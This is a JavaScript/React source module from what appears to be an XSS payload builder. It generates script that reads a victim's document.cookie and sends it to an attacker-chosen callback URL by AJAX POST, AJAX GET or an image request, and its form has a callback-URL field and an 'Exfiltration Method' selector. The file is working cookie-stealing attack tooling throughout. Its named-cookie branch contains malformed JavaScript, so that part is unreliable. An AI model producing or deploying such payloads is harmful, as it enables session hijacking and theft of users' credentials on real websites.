import React from 'react'

export function cook (instance, vars) {
  let cookieSelection = 'var c = document.cookie'

  if (instance.cookie) {
    cookieSelection = `var c = document.cookie.match(new RegExp('(^| )${instance.cookie}=([^;]+)'));)[2]`
  }

  let callbackName = `${instance.id}_cb`
  let callback = `var ${callbackName} = function () { }`
  if (instance.waitForResponse) {
    callback = `var ${callbackName} = function () { __XSS_CHEF_ENTRY_POINT__ }`
  }

  let submission = ''
  if (instance.method === 'post:ajax') {
    submission = `ajaxRequest('POST', '${instance.callbackUrl}', 'cookie=' + encodeURIComponent(c), ${callbackName})`
  } else if (instance.method === 'get:dom') {
    submission = [
      'var i = new Image()',
      `i.src = '${instance.callbackUrl}?c=' + encodeURIComponent(c)`,
      `${callbackName}()`
    ].join('\n')
  } else if (instance.method === 'get:ajax') {
    submission = `ajaxRequest('GET', '${instance.callbackUrl}?c=' + encodeURIComponent(c), undefined, ${callbackName})`
  }

  let eof = ''
  if (!instance.waitForResponse) {
    eof = '__XSS_CHEF_ENTRY_POINT__'
  }

  const payload = [
    callback,
    cookieSelection,
    submission,
    eof
  ].join('\n')

  return {
    payload: vars.payload.replace(/__XSS_CHEF_ENTRY_POINT__/g, payload)
  }
}

export function init () {
  return {
    callbackUrl: '',
    method: 'post:ajax',
    waitForResponse: true
  }
}

export function render (instance, setRecipeProperty) {
  return (
    <div>
      <div className="form-group">
        <label htmlFor={`${instance.id}-callbackUrl`}>Callback URL</label>
        <input id={`${instance.id}-callbackUrl`}
          type="text"
          className="form-control"
          placeholder="http://your.domain.com/cookie"
          value={instance.callbackUrl}
          onChange={(e) => setRecipeProperty(
            instance.id,
            'callbackUrl',
            e.target.value
          )}
        />
      </div>
      <div className="form-group">
        <label htmlFor={`${instance.id}-method`}>Exfiltration Method</label>
        <select id={`${instance.id}-method`}
          className="form-control"
          value={instance.method}
          onChange={(e) => setRecipeProperty(
            instance.id,
            'method',
            e.target.value
          )}>
          <option value="get:ajax">GET: AJAX</option>
          <option value="get:dom">GET: DOM</option>
          <option value="post:ajax">POST: AJAX</option>
        </select>
      </div>
      <div className="float-left mr-3 form-group form-check">
        <input
          id={`${instance.id}-waitForResponse`}
          type="checkbox"
          checked={instance.waitForResponse}
          className="form-check-input"
          onChange={e => setRecipeProperty(
            instance.id,
            'waitForResponse',
            e.target.checked
          )}
        />
        <label
          className="form-check-label"
          htmlFor={`${instance.id}-waitForResponse`}>
          Halt next operation until response is received
        </label>
      </div>
    </div>
  )
}

export function validate (instance) {
  if (instance.callbackUrl === '') {
    return false
  }

  return true
}
